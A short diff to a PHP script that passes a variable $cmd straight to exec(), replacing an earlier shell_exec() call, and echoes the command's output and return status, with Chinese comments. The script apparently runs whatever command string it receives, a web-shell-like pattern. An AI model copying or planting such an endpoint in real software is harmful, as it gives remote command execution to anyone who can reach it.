@@ -18,7 +18,29 @@ if ($cmd == '') {
     die();
 }
 
+$output = array();
+$returnValue = 0;
 
-$output = shell_exec($cmd);
-$output = nl2br($output); // 将换行符转换为 <br> 标签，使输出在网页中换行显示
-echo $output;
+// 执行 shell 命令
+exec($cmd, $output, $returnValue);
+
+// 检查返回值以确定命令是否成功执行
+if ($returnValue === 0) {
+    // 命令执行成功
+    echo "Command executed successfully.\n";
+    
+    // 输出正确的结果
+    echo "Output:\n";
+    foreach ($output as $line) {
+        echo $line . "\n";
+    }
+} else {
+    // 命令执行失败
+    echo "Command failed to execute.\n";
+    
+    // 输出错误信息
+    echo "Error:\n";
+    foreach ($output as $line) {
+        echo $line . "\n";
+    }
+}
